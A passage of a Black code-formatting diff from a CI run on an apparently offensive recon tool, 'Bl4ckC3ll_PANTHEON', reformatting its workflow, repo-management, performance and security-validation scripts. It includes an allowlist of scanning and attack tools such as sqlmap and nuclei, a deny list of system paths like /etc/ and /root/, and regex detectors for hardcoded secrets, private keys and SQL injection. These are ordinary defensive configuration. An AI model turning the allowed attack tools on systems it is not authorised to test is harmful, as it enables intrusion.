0,\n             \"prs_merged\": 0,\n-            \"merge_failures\": []\n-        }\n-        \n+            \"merge_failures\": [],\n+        }\n+\n         if not self.config[\"auto_merge\"][\"enabled\"]:\n             merge_report[\"status\"] = \"Auto-merge disabled\"\n             return merge_report\n-            \n+\n         # Note: This would require GitHub API integration\n         # For now, just report that the feature is configured\n         merge_report[\"status\"] = \"Auto-merge configured but requires GitHub API setup\"\n-        \n+\n         return merge_report\n-        \n+\n     def run_full_management_cycle(self) -> int:\n         \"\"\"Run complete repository management cycle\"\"\"\n         print(\"\ud83e\udd16 Starting Intelligent Repository Management Cycle\")\n         print(\"=\" * 60)\n-        \n+\n         cycle_start = time.time()\n-        \n+\n         try:\n             # Phase 1: Health Check\n             health_report = self.check_repository_health()\n-            \n+\n             # Phase 2: Maintenance\n             maintenance_report = self.automated_maintenance()\n-            \n+\n             # Phase 3: Optimization\n             optimization_report = self.optimize_repository()\n-            \n+\n             # Phase 4: Monitoring\n             monitoring_report = self.monitor_and_alert()\n-            \n+\n             # Phase 5: Auto-merge (if enabled)\n             merge_report = self.auto_merge_eligible_prs()\n-            \n+\n             # Generate comprehensive report\n             full_report = {\n                 \"cycle_duration\": time.time() - cycle_start,\n                 \"timestamp\": datetime.now().isoformat(),\n                 \"health\": health_report,\n                 \"maintenance\": maintenance_report,\n                 \"optimization\": optimization_report,\n                 \"monitoring\": monitoring_report,\n-                \"auto_merge\": merge_report\n+                \"auto_merge\": merge_report,\n             }\n-            \n+\n             # Save reports\n-            with open('repo-management-report.json', 'w') as f:\n+            with open(\"repo-management-report.json\", \"w\") as f:\n                 json.dump(full_report, f, indent=2, default=str)\n-                \n+\n             # Generate summary\n             print(f\"\\n\u2705 Repository management cycle completed!\")\n             print(f\"\u23f1\ufe0f  Duration: {full_report['cycle_duration']:.2f} seconds\")\n             print(f\"\ud83c\udfe5 Health Status: {health_report['overall_status']}\")\n-            print(f\"\ud83d\udd27 Maintenance Tasks: {len(maintenance_report['tasks_completed'])} completed\")\n-            print(f\"\u26a1 Optimizations: {len(optimization_report['optimizations_applied'])} applied\")\n+            print(\n+                f\"\ud83d\udd27 Maintenance Tasks: {len(maintenance_report['tasks_completed'])} completed\"\n+            )\n+            print(\n+                f\"\u26a1 Optimizations: {len(optimization_report['optimizations_applied'])} applied\"\n+            )\n             print(f\"\ud83d\udcca Alerts: {len(monitoring_report['alerts'])} active\")\n             print(f\"\ud83d\udcc1 Report saved: repo-management-report.json\")\n-            \n+\n             # Determine exit code\n-            if health_report['overall_status'] == 'critical':\n+            if health_report[\"overall_status\"] == \"critical\":\n                 return 1\n-            elif len(monitoring_report['alerts']) > 3:\n+            elif len(monitoring_report[\"alerts\"]) > 3:\n                 return 1\n             else:\n                 return 0\n-                \n+\n         except Exception as e:\n             print(f\"\u274c Repository management cycle failed: {e}\")\n             return 1\n \n-if __name__ == '__main__':\n+\n+if __name__ == \"__main__\":\n     manager = IntelligentRepoManager()\n     exit_code = manager.run_full_management_cycle()\n-    sys.exit(exit_code)\n\\ No newline at end of file\n+    sys.exit(exit_code)\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/master_workflow_automation.py\t2025-09-14 19:22:47.223448+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/master_workflow_automation.py\t2025-09-14 19:23:13.621026+00:00\n@@ -12,186 +12,198 @@\n from pathlib import Path\n from typing import Dict, List, Any\n from datetime import datetime\n import argparse\n \n+\n class MasterWorkflowAutomation:\n     def __init__(self):\n         self.start_time = time.time()\n         self.results = {}\n         self.total_success = True\n-        \n-    def run_component(self, name: str, command: List[str], timeout: int = 300) -> Dict[str, Any]:\n+\n+    def run_component(\n+        self, name: str, command: List[str], timeout: int = 300\n+    ) -> Dict[str, Any]:\n         \"\"\"Run a workflow component and capture results\"\"\"\n         print(f\"\\n\ud83d\udd27 Running {name}...\")\n         print(\"-\" * 50)\n-        \n+\n         component_start = time.time()\n-        \n+\n         try:\n             result = subprocess.run(\n-                command,\n-                capture_output=True,\n-                text=True,\n-                timeout=timeout,\n-                cwd='.'\n-            )\n-            \n+                command, capture_output=True, text=True, timeout=timeout, cwd=\".\"\n+            )\n+\n             duration = time.time() - component_start\n-            \n+\n             component_result = {\n-                'name': name,\n-                'success': result.returncode == 0,\n-                'duration': duration,\n-                'returncode': result.returncode,\n-                'stdout': result.stdout,\n-                'stderr': result.stderr,\n-                'timestamp': datetime.now().isoformat()\n+                \"name\": name,\n+                \"success\": result.returncode == 0,\n+                \"duration\": duration,\n+                \"returncode\": result.returncode,\n+                \"stdout\": result.stdout,\n+                \"stderr\": result.stderr,\n+                \"timestamp\": datetime.now().isoformat(),\n             }\n-            \n-            if component_result['success']:\n+\n+            if component_result[\"success\"]:\n                 print(f\"\u2705 {name} completed successfully in {duration:.2f}s\")\n             else:\n                 print(f\"\u274c {name} failed with exit code {result.returncode}\")\n                 if result.stderr:\n                     print(f\"Error: {result.stderr[:500]}\")\n                 self.total_success = False\n-                \n+\n             return component_result\n-            \n+\n         except subprocess.TimeoutExpired:\n             print(f\"\u23f0 {name} timed out after {timeout}s\")\n             self.total_success = False\n             return {\n-                'name': name,\n-                'success': False,\n-                'duration': timeout,\n-                'returncode': -1,\n-                'error': 'Timeout',\n-                'timestamp': datetime.now().isoformat()\n+                \"name\": name,\n+                \"success\": False,\n+                \"duration\": timeout,\n+                \"returncode\": -1,\n+                \"error\": \"Timeout\",\n+                \"timestamp\": datetime.now().isoformat(),\n             }\n         except Exception as e:\n             print(f\"\ud83d\udca5 {name} encountered an error: {e}\")\n             self.total_success = False\n             return {\n-                'name': name,\n-                'success': False,\n-                'duration': time.time() - component_start,\n-                'returncode': -1,\n-                'error': str(e),\n-                'timestamp': datetime.now().isoformat()\n+                \"name\": name,\n+                \"success\": False,\n+                \"duration\": time.time() - component_start,\n+                \"returncode\": -1,\n+                \"error\": str(e),\n+                \"timestamp\": datetime.now().isoformat(),\n             }\n-            \n+\n     def run_security_validation(self) -> Dict[str, Any]:\n         \"\"\"Run comprehensive security validation\"\"\"\n         return self.run_component(\n             \"Security Validation\",\n             [sys.executable, \"scripts/security_validator.py\"],\n-            timeout=120\n-        )\n-        \n+            timeout=120,\n+        )\n+\n     def run_performance_testing(self) -> Dict[str, Any]:\n         \"\"\"Run performance benchmarks\"\"\"\n         return self.run_component(\n             \"Performance Testing\",\n             [sys.executable, \"scripts/performance_tester.py\"],\n-            timeout=180\n-        )\n-        \n+            timeout=180,\n+        )\n+\n     def run_documentation_validation(self) -> Dict[str, Any]:\n         \"\"\"Run documentation validation\"\"\"\n         return self.run_component(\n             \"Documentation Validation\",\n             [sys.executable, \"scripts/docs_validator.py\"],\n-            timeout=60\n-        )\n-        \n+            timeout=60,\n+        )\n+\n     def run_comprehensive_testing(self) -> Dict[str, Any]:\n         \"\"\"Run comprehensive test framework\"\"\"\n         return self.run_component(\n             \"Comprehensive Test Framework\",\n             [sys.executable, \"scripts/comprehensive_test_framework.py\"],\n-            timeout=600\n-        )\n-        \n+            timeout=600,\n+        )\n+\n     def run_intelligent_debugging(self) -> Dict[str, Any]:\n         \"\"\"Run intelligent debugging system\"\"\"\n         return self.run_component(\n             \"Intelligent Debugging\",\n             [sys.executable, \"scripts/intelligent_debugger.py\"],\n-            timeout=600\n-        )\n-        \n+            timeout=600,\n+        )\n+\n     def run_repository_management(self) -> Dict[str, Any]:\n         \"\"\"Run repository management\"\"\"\n         return self.run_component(\n             \"Repository Management\",\n             [sys.executable, \"scripts/intelligent_repo_manager.py\"],\n-            timeout=300\n-        )\n-        \n+            timeout=300,\n+        )\n+\n     def run_existing_test_suites(self) -> List[Dict[str, Any]]:\n         \"\"\"Run existing test suites\"\"\"\n         test_suites = [\n             (\"Enhanced Test Suite\", [sys.executable, \"enhanced_test_suite.py\"]),\n             (\"Final Integration Test\", [sys.executable, \"final_integration_test.py\"]),\n-            (\"Test Automation Integration\", [sys.executable, \"test_automation_integration.py\"])\n+            (\n+                \"Test Automation Integration\",\n+                [sys.executable, \"test_automation_integration.py\"],\n+            ),\n         ]\n-        \n+\n         results = []\n         for name, command in test_suites:\n             result = self.run_component(name, command, timeout=180)\n             results.append(result)\n-            \n+\n         return results\n-        \n+\n     def run_code_quality_checks(self) -> List[Dict[str, Any]]:\n         \"\"\"Run code quality and linting checks\"\"\"\n         quality_checks = []\n-        \n+\n         # Python code quality\n         if Path(\"requirements.txt\").exists():\n             # Black formatting check\n-            quality_checks.append(self.run_component(\n-                \"Black Code Formatting Check\",\n-                [sys.executable, \"-m\", \"black\", \"--check\", \"--diff\", \".\"],\n-                timeout=60\n-            ))\n-            \n+            quality_checks.append(\n+                self.run_component(\n+                    \"Black Code Formatting Check\",\n+                    [sys.executable, \"-m\", \"black\", \"--check\", \"--diff\", \".\"],\n+                    timeout=60,\n+                )\n+            )\n+\n             # isort import sorting check\n-            quality_checks.append(self.run_component(\n-                \"isort Import Sorting Check\",\n-                [sys.executable, \"-m\", \"isort\", \"--check-only\", \"--diff\", \".\"],\n-                timeout=60\n-            ))\n-            \n+            quality_checks.append(\n+                self.run_component(\n+                    \"isort Import Sorting Check\",\n+                    [sys.executable, \"-m\", \"isort\", \"--check-only\", \"--diff\", \".\"],\n+                    timeout=60,\n+                )\n+            )\n+\n         # Node.js code quality\n         if Path(\"package.json\").exists():\n-            quality_checks.append(self.run_component(\n-                \"ESLint JavaScript Linting\",\n-                [\"npm\", \"run\", \"lint:check\"],\n-                timeout=120\n-            ))\n-            \n+            quality_checks.append(\n+                self.run_component(\n+                    \"ESLint JavaScript Linting\",\n+                    [\"npm\", \"run\", \"lint:check\"],\n+                    timeout=120,\n+                )\n+            )\n+\n         return quality_checks\n-        \n+\n     def generate_comprehensive_report(self) -> str:\n         \"\"\"Generate comprehensive workflow report\"\"\"\n         total_duration = time.time() - self.start_time\n-        \n+\n         # Count successes and failures\n         all_results = []\n         for key, value in self.results.items():\n             if isinstance(value, list):\n                 all_results.extend(value)\n             else:\n                 all_results.append(value)\n-                \n-        successful_components = sum(1 for r in all_results if r.get('success', False))\n+\n+        successful_components = sum(1 for r in all_results if r.get(\"success\", False))\n         total_components = len(all_results)\n-        success_rate = (successful_components / total_components * 100) if total_components > 0 else 0\n-        \n+        success_rate = (\n+            (successful_components / total_components * 100)\n+            if total_components > 0\n+            else 0\n+        )\n+\n         report = f\"\"\"# \ud83d\ude80 Master Workflow Automation Report\n \n ## \ud83d\udcca Executive Summary\n \n - **Execution Time**: {total_duration:.2f} seconds\n@@ -206,28 +218,32 @@\n \"\"\"\n \n         # Add detailed results for each category\n         for category, results in self.results.items():\n             report += f\"### {category.replace('_', ' ').title()}\\n\\n\"\n-            \n+\n             if isinstance(results, list):\n                 for result in results:\n-                    status = \"\u2705\" if result.get('success', False) else \"\u274c\"\n-                    report += f\"- {status} **{result['name']}** ({result['duration']:.2f}s)\\n\"\n-                    if not result.get('success', False) and 'error' in result:\n+                    status = \"\u2705\" if result.get(\"success\", False) else \"\u274c\"\n+                    report += (\n+                        f\"- {status} **{result['name']}** ({result['duration']:.2f}s)\\n\"\n+                    )\n+                    if not result.get(\"success\", False) and \"error\" in result:\n                         report += f\"  - Error: {result['error']}\\n\"\n             else:\n-                status = \"\u2705\" if results.get('success', False) else \"\u274c\"\n-                report += f\"- {status} **{results['name']}** ({results['duration']:.2f}s)\\n\"\n-                if not results.get('success', False) and 'error' in results:\n+                status = \"\u2705\" if results.get(\"success\", False) else \"\u274c\"\n+                report += (\n+                    f\"- {status} **{results['name']}** ({results['duration']:.2f}s)\\n\"\n+                )\n+                if not results.get(\"success\", False) and \"error\" in results:\n                     report += f\"  - Error: {results['error']}\\n\"\n-                    \n+\n             report += \"\\n\"\n-            \n+\n         # Add recommendations\n         report += \"## \ud83c\udfaf Recommendations\\n\\n\"\n-        \n+\n         if self.total_success:\n             report += \"\"\"- \u2705 All workflow components completed successfully\n - \ud83d\udcca Repository is in excellent health\n - \ud83d\udd04 Continue regular automated maintenance\n - \ud83d\udcc8 Consider expanding test coverage further\n@@ -257,107 +273,115 @@\n ---\n *Generated by Master Workflow Automation System*\n \"\"\"\n \n         return report\n-        \n+\n     def run_complete_workflow(self, quick_mode: bool = False) -> int:\n         \"\"\"Run the complete workflow automation system\"\"\"\n         print(\"\ud83d\ude80 Starting Master Workflow Automation System\")\n         print(\"=\" * 60)\n         print(f\"Mode: {'Quick' if quick_mode else 'Comprehensive'}\")\n         print(f\"Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}\")\n         print()\n-        \n+\n         # Phase 1: Security and Performance Validation\n         print(\"\ud83d\udd12 Phase 1: Security and Performance Validation\")\n-        self.results['security_validation'] = self.run_security_validation()\n-        self.results['performance_testing'] = self.run_performance_testing()\n-        \n+        self.results[\"security_validation\"] = self.run_security_validation()\n+        self.results[\"performance_testing\"] = self.run_performance_testing()\n+\n         # Phase 2: Code Quality Checks\n         print(\"\\n\ud83d\udccf Phase 2: Code Quality Checks\")\n-        self.results['code_quality_checks'] = self.run_code_quality_checks()\n-        \n+        self.results[\"code_quality_checks\"] = self.run_code_quality_checks()\n+\n         # Phase 3: Documentation Validation\n         print(\"\\n\ud83d\udcda Phase 3: Documentation Validation\")\n-        self.results['documentation_validation'] = self.run_documentation_validation()\n-        \n+        self.results[\"documentation_validation\"] = self.run_documentation_validation()\n+\n         # Phase 4: Existing Test Suites\n         print(\"\\n\ud83e\uddea Phase 4: Existing Test Suites\")\n-        self.results['existing_test_suites'] = self.run_existing_test_suites()\n-        \n+        self.results[\"existing_test_suites\"] = self.run_existing_test_suites()\n+\n         if not quick_mode:\n             # Phase 5: Comprehensive Testing (only in full mode)\n             print(\"\\n\ud83d\udd2c Phase 5: Comprehensive Testing\")\n-            self.results['comprehensive_testing'] = self.run_comprehensive_testing()\n-            \n+            self.results[\"comprehensive_testing\"] = self.run_comprehensive_testing()\n+\n             # Phase 6: Intelligent Debugging (only in full mode)\n             print(\"\\n\ud83d\udc1b Phase 6: Intelligent Debugging\")\n-            self.results['intelligent_debugging'] = self.run_intelligent_debugging()\n-            \n+            self.results[\"intelligent_debugging\"] = self.run_intelligent_debugging()\n+\n         # Phase 7: Repository Management\n         print(\"\\n\ud83c\udfe0 Phase 7: Repository Management\")\n-        self.results['repository_management'] = self.run_repository_management()\n-        \n+        self.results[\"repository_management\"] = self.run_repository_management()\n+\n         # Generate reports\n         print(\"\\n\ud83d\udcca Generating Reports...\")\n         comprehensive_report = self.generate_comprehensive_report()\n-        \n+\n         # Save reports\n-        with open('master-workflow-report.md', 'w') as f:\n+        with open(\"master-workflow-report.md\", \"w\") as f:\n             f.write(comprehensive_report)\n-            \n-        with open('master-workflow-results.json', 'w') as f:\n+\n+        with open(\"master-workflow-results.json\", \"w\") as f:\n             json.dump(self.results, f, indent=2, default=str)\n-            \n+\n         # Final summary\n         total_duration = time.time() - self.start_time\n         print(f\"\\n{'='*60}\")\n         print(f\"\ud83c\udfc1 Master Workflow Automation Complete!\")\n         print(f\"\u23f1\ufe0f  Total Duration: {total_duration:.2f} seconds\")\n-        print(f\"\ud83d\udcca Overall Status: {'\u2705 SUCCESS' if self.total_success else '\u274c FAILURE'}\")\n+        print(\n+            f\"\ud83d\udcca Overall Status: {'\u2705 SUCCESS' if self.total_success else '\u274c FAILURE'}\"\n+        )\n         print(f\"\ud83d\udcc1 Reports Generated:\")\n         print(f\"   - master-workflow-report.md\")\n         print(f\"   - master-workflow-results.json\")\n-        \n+\n         if not self.total_success:\n-            print(f\"\\n\u26a0\ufe0f  Some components failed. Check the detailed report for information.\")\n-            \n+            print(\n+                f\"\\n\u26a0\ufe0f  Some components failed. Check the detailed report for information.\"\n+            )\n+\n         return 0 if self.total_success else 1\n \n+\n def main():\n-    parser = argparse.ArgumentParser(description='Master Workflow Automation System')\n-    parser.add_argument('--quick', action='store_true', \n-                       help='Run in quick mode (skip comprehensive testing and debugging)')\n-    parser.add_argument('--component', type=str, \n-                       help='Run specific component only')\n-    \n+    parser = argparse.ArgumentParser(description=\"Master Workflow Automation System\")\n+    parser.add_argument(\n+        \"--quick\",\n+        action=\"store_true\",\n+        help=\"Run in quick mode (skip comprehensive testing and debugging)\",\n+    )\n+    parser.add_argument(\"--component\", type=str, help=\"Run specific component only\")\n+\n     args = parser.parse_args()\n-    \n+\n     automation = MasterWorkflowAutomation()\n-    \n+\n     if args.component:\n         # Run specific component\n         component_map = {\n-            'security': automation.run_security_validation,\n-            'performance': automation.run_performance_testing,\n-            'docs': automation.run_documentation_validation,\n-            'testing': automation.run_comprehensive_testing,\n-            'debugging': automation.run_intelligent_debugging,\n-            'management': automation.run_repository_management\n+            \"security\": automation.run_security_validation,\n+            \"performance\": automation.run_performance_testing,\n+            \"docs\": automation.run_documentation_validation,\n+            \"testing\": automation.run_comprehensive_testing,\n+            \"debugging\": automation.run_intelligent_debugging,\n+            \"management\": automation.run_repository_management,\n         }\n-        \n+\n         if args.component in component_map:\n             result = component_map[args.component]()\n             print(f\"\\nComponent result: {result}\")\n-            sys.exit(0 if result.get('success', False) else 1)\n+            sys.exit(0 if result.get(\"success\", False) else 1)\n         else:\n             print(f\"Unknown component: {args.component}\")\n             print(f\"Available components: {', '.join(component_map.keys())}\")\n             sys.exit(1)\n     else:\n         # Run complete workflow\n         exit_code = automation.run_complete_workflow(quick_mode=args.quick)\n         sys.exit(exit_code)\n \n-if __name__ == '__main__':\n-    main()\n\\ No newline at end of file\n+\n+if __name__ == \"__main__\":\n+    main()\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/security_config.py\t2025-09-14 19:10:58.579755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/security_config.py\t2025-09-14 19:23:13.648130+00:00\n@@ -1,37 +1,46 @@\n # Security Configuration for Bl4ckC3ll_PANTHEON\n \n # Command execution security\n ALLOWED_COMMANDS = {\n-    'nuclei', 'subfinder', 'httpx', 'naabu', 'amass', \n-    'nmap', 'sqlmap', 'ffuf', 'gobuster', 'whatweb',\n-    'dig', 'whois', 'curl', 'wget', 'ping', 'host'\n+    \"nuclei\",\n+    \"subfinder\",\n+    \"httpx\",\n+    \"naabu\",\n+    \"amass\",\n+    \"nmap\",\n+    \"sqlmap\",\n+    \"ffuf\",\n+    \"gobuster\",\n+    \"whatweb\",\n+    \"dig\",\n+    \"whois\",\n+    \"curl\",\n+    \"wget\",\n+    \"ping\",\n+    \"host\",\n }\n \n # Rate limiting settings\n-RATE_LIMITS = {\n-    'default_rps': 10,\n-    'burst_limit': 50,\n-    'timeout_seconds': 30\n-}\n+RATE_LIMITS = {\"default_rps\": 10, \"burst_limit\": 50, \"timeout_seconds\": 30}\n \n-# Input validation settings  \n+# Input validation settings\n INPUT_LIMITS = {\n-    'max_domain_length': 255,\n-    'max_url_length': 2000,\n-    'max_filename_length': 255,\n-    'allowed_url_schemes': ['http', 'https']\n+    \"max_domain_length\": 255,\n+    \"max_url_length\": 2000,\n+    \"max_filename_length\": 255,\n+    \"allowed_url_schemes\": [\"http\", \"https\"],\n }\n \n # File operation security\n FILE_SECURITY = {\n-    'allowed_extensions': ['.txt', '.json', '.csv', '.html', '.xml'],\n-    'max_file_size': 100 * 1024 * 1024,  # 100MB\n-    'forbidden_paths': ['/etc/', '/bin/', '/sbin/', '/usr/bin/', '/root/']\n+    \"allowed_extensions\": [\".txt\", \".json\", \".csv\", \".html\", \".xml\"],\n+    \"max_file_size\": 100 * 1024 * 1024,  # 100MB\n+    \"forbidden_paths\": [\"/etc/\", \"/bin/\", \"/sbin/\", \"/usr/bin/\", \"/root/\"],\n }\n \n # Logging security\n LOGGING_CONFIG = {\n-    'sanitize_logs': True,\n-    'max_log_entry_length': 1000,\n-    'log_security_events': True\n+    \"sanitize_logs\": True,\n+    \"max_log_entry_length\": 1000,\n+    \"log_security_events\": True,\n }\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/security_validator.py\t2025-09-14 19:15:06.527645+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/security_validator.py\t2025-09-14 19:23:13.680609+00:00\n@@ -9,178 +9,197 @@\n import sys\n import os\n from pathlib import Path\n from typing import Dict, List, Any\n import re\n+\n \n class SecurityValidator:\n     def __init__(self):\n         self.issues = []\n         self.critical_patterns = [\n             r'password\\s*=\\s*[\"\\'][^\"\\']+[\"\\']',\n             r'api_key\\s*=\\s*[\"\\'][^\"\\']+[\"\\']',\n             r'secret\\s*=\\s*[\"\\'][^\"\\']+[\"\\']',\n             r'token\\s*=\\s*[\"\\'][^\"\\']+[\"\\']',\n-            r'-----BEGIN.*PRIVATE KEY-----',\n+            r\"-----BEGIN.*PRIVATE KEY-----\",\n         ]\n-        \n+\n     def validate_python_files(self, file_path: Path) -> List[str]:\n         \"\"\"Validate Python files for security issues\"\"\"\n         issues = []\n         try:\n-            with open(file_path, 'r', encoding='utf-8') as f:\n+            with open(file_path, \"r\", encoding=\"utf-8\") as f:\n                 content = f.read()\n-                \n+\n             # Check for hardcoded secrets\n             for pattern in self.critical_patterns:\n                 if re.search(pattern, content, re.IGNORECASE):\n-                    issues.append(f\"CRITICAL: Potential hardcoded secret in {file_path}\")\n-                    \n+                    issues.append(\n+                        f\"CRITICAL: Potential hardcoded secret in {file_path}\"\n+                    )\n+\n             # Check for dangerous imports\n-            dangerous_imports = ['eval', 'exec', 'input', '__import__']\n+            dangerous_imports = [\"eval\", \"exec\", \"input\", \"__import__\"]\n             for imp in dangerous_imports:\n                 if f\"({imp}\" in content or f\" {imp}(\" in content:\n-                    issues.append(f\"WARNING: Potentially dangerous function '{imp}' used in {file_path}\")\n-                    \n+                    issues.append(\n+                        f\"WARNING: Potentially dangerous function '{imp}' used in {file_path}\"\n+                    )\n+\n             # Check for SQL injection patterns\n             sql_patterns = [\n-                r'cursor\\.execute\\([^)]*%[^)]*\\)',\n-                r'\\.format\\([^)]*\\).*execute',\n+                r\"cursor\\.execute\\([^)]*%[^)]*\\)\",\n+                r\"\\.format\\([^)]*\\).*execute\",\n             ]\n             for pattern in sql_patterns:\n                 if re.search(pattern, content):\n-                    issues.append(f\"WARNING: Potential SQL injection vulnerability in {file_path}\")\n-                    \n+                    issues.append(\n+                        f\"WARNING: Potential SQL injection vulnerability in {file_path}\"\n+                    )\n+\n         except Exception as e:\n             issues.append(f\"ERROR: Could not validate {file_path}: {e}\")\n-            \n+\n         return issues\n-        \n+\n     def validate_json_files(self, file_path: Path) -> List[str]:\n         \"\"\"Validate JSON configuration files\"\"\"\n         issues = []\n         try:\n-            with open(file_path, 'r', encoding='utf-8') as f:\n+            with open(file_path, \"r\", encoding=\"utf-8\") as f:\n                 config = json.load(f)\n-                \n+\n             # Check for sensitive data in configs\n             if self._contains_sensitive_data(config):\n                 issues.append(f\"WARNING: Potential sensitive data in {file_path}\")\n-                \n+\n             # Validate security-specific configs\n-            if 'security' in str(config).lower():\n+            if \"security\" in str(config).lower():\n                 if not self._validate_security_config(config):\n-                    issues.append(f\"WARNING: Insecure security configuration in {file_path}\")\n-                    \n+                    issues.append(\n+                        f\"WARNING: Insecure security configuration in {file_path}\"\n+                    )\n+\n         except json.JSONDecodeError as e:\n             issues.append(f\"ERROR: Invalid JSON in {file_path}: {e}\")\n         except Exception as e:\n             issues.append(f\"ERROR: Could not validate {file_path}: {e}\")\n-            \n+\n         return issues\n-        \n+\n     def validate_yaml_files(self, file_path: Path) -> List[str]:\n         \"\"\"Validate YAML configuration files\"\"\"\n         issues = []\n         try:\n-            with open(file_path, 'r', encoding='utf-8') as f:\n+            with open(file_path, \"r\", encoding=\"utf-8\") as f:\n                 config = yaml.safe_load(f)\n-                \n+\n             if config and self._contains_sensitive_data(config):\n                 issues.append(f\"WARNING: Potential sensitive data in {file_path}\")\n-                \n+\n         except yaml.YAMLError as e:\n             issues.append(f\"ERROR: Invalid YAML in {file_path}: {e}\")\n         except Exception as e:\n             issues.append(f\"ERROR: Could not validate {file_path}: {e}\")\n-            \n+\n         return issues\n-        \n+\n     def _contains_sensitive_data(self, data: Any) -> bool:\n         \"\"\"Check if data structure contains sensitive information\"\"\"\n         if isinstance(data, dict):\n             for key, value in data.items():\n-                if any(term in str(key).lower() for term in ['password', 'secret', 'key', 'token']):\n+                if any(\n+                    term in str(key).lower()\n+                    for term in [\"password\", \"secret\", \"key\", \"token\"]\n+                ):\n                     if isinstance(value, str) and len(value) > 10:\n                         return True\n                 if self._contains_sensitive_data(value):\n                     return True\n         elif isinstance(data, list):\n             for item in data:\n                 if self._contains_sensitive_data(item):\n                     return True\n         return False\n-        \n+\n     def _validate_security_config(self, config: Dict) -> bool:\n         \"\"\"Validate security-specific configuration\"\"\"\n         # Check for weak security settings\n         if isinstance(config, dict):\n             for key, value in config.items():\n-                if 'ssl' in key.lower() or 'tls' in key.lower():\n+                if \"ssl\" in key.lower() or \"tls\" in key.lower():\n                     if value is False:\n                         return False\n-                if 'verify' in key.lower():\n+                if \"verify\" in key.lower():\n                     if value is False:\n                         return False\n         return True\n-        \n+\n     def validate_all(self) -> int:\n         \"\"\"Validate all relevant files\"\"\"\n         print(\"\ud83d\udd0d Running Security Configuration Validation...\")\n-        \n+\n         # Get all files to validate\n-        python_files = list(Path('.').glob('**/*.py'))\n-        json_files = list(Path('.').glob('**/*.json'))\n-        yaml_files = list(Path('.').glob('**/*.yaml')) + list(Path('.').glob('**/*.yml'))\n-        \n+        python_files = list(Path(\".\").glob(\"**/*.py\"))\n+        json_files = list(Path(\".\").glob(\"**/*.json\"))\n+        yaml_files = list(Path(\".\").glob(\"**/*.yaml\")) + list(\n+            Path(\".\").glob(\"**/*.yml\")\n+        )\n+\n         total_issues = 0\n-        \n+\n         # Validate Python files\n         for file_path in python_files:\n-            if '.git' in str(file_path) or '__pycache__' in str(file_path):\n+            if \".git\" in str(file_path) or \"__pycache__\" in str(file_path):\n                 continue\n             issues = self.validate_python_files(file_path)\n             self.issues.extend(issues)\n             total_issues += len(issues)\n-            \n+\n         # Validate JSON files\n         for file_path in json_files:\n-            if '.git' in str(file_path):\n+            if \".git\" in str(file_path):\n                 continue\n             issues = self.validate_json_files(file_path)\n             self.issues.extend(issues)\n             total_issues += len(issues)\n-            \n+\n         # Validate YAML files\n         for file_path in yaml_files:\n-            if '.git' in str(file_path):\n+            if \".git\" in str(file_path):\n                 continue\n             issues = self.validate_yaml_files(file_path)\n             self.issues.extend(issues)\n             total_issues += len(issues)\n-            \n+\n         # Report results\n         if total_issues == 0:\n             print(\"\u2705 Security validation passed - no issues found!\")\n         else:\n             print(f\"\u26a0\ufe0f  Found {total_issues} security issues:\")\n             for issue in self.issues:\n                 print(f\"  - {issue}\")\n-                \n+\n         # Save report\n-        with open('security-validation-report.json', 'w') as f:\n-            json.dump({\n-                'total_issues': total_issues,\n-                'issues': self.issues,\n-                'files_checked': {\n-                    'python': len(python_files),\n-                    'json': len(json_files),\n-                    'yaml': len(yaml_files)\n-                }\n-            }, f, indent=2)\n-            \n+        with open(\"security-validation-report.json\", \"w\") as f:\n+            json.dump(\n+                {\n+                    \"total_issues\": total_issues,\n+                    \"issues\": self.issues,\n+                    \"files_checked\": {\n+                        \"python\": len(python_files),\n+                        \"json\": len(json_files),\n+                        \"yaml\": len(yaml_files),\n+                    },\n+                },\n+                f,\n+                indent=2,\n+            )\n+\n         return total_issues\n \n-if __name__ == '__main__':\n+\n+if __name__ == \"__main__\":\n     validator = SecurityValidator()\n     issues = validator.validate_all()\n-    sys.exit(1 if issues > 0 else 0)\n\\ No newline at end of file\n+    sys.exit(1 if issues > 0 else 0)\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/performance_tester.py\t2025-09-14 19:15:57.642991+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/performance_tester.py\t2025-09-14 19:23:13.698727+00:00\n@@ -11,179 +11,210 @@\n import subprocess\n from pathlib import Path\n from typing import Dict, List, Any\n import statistics\n \n+\n class PerformanceTester:\n     def __init__(self):\n         self.results = {}\n         self.benchmarks = []\n-        \n+\n     def measure_startup_time(self) -> float:\n         \"\"\"Measure application startup time\"\"\"\n         start_time = time.time()\n         try:\n-            result = subprocess.run([\n-                'python3', 'bl4ckc3ll_p4nth30n.py', '--help'\n-            ], capture_output=True, text=True, timeout=30)\n+            result = subprocess.run(\n+                [\"python3\", \"bl4ckc3ll_p4nth30n.py\", \"--help\"],\n+                capture_output=True,\n+                text=True,\n+                timeout=30,\n+            )\n             end_time = time.time()\n             if result.returncode == 0:\n                 return end_time - start_time\n         except subprocess.TimeoutExpired:\n-            return float('inf')\n-        return float('inf')\n-        \n+            return float(\"inf\")\n+        return float(\"inf\")\n+\n     def measure_memory_usage(self) -> Dict[str, float]:\n         \"\"\"Measure memory usage during basic operations\"\"\"\n         process = psutil.Process()\n         initial_memory = process.memory_info().rss / (1024 * 1024)  # MB\n-        \n+\n         # Run a basic operation\n         try:\n-            subprocess.run([\n-                'python3', 'bl4ckc3ll_p4nth30n.py', '--check-tools'\n-            ], capture_output=True, text=True, timeout=60)\n+            subprocess.run(\n+                [\"python3\", \"bl4ckc3ll_p4nth30n.py\", \"--check-tools\"],\n+                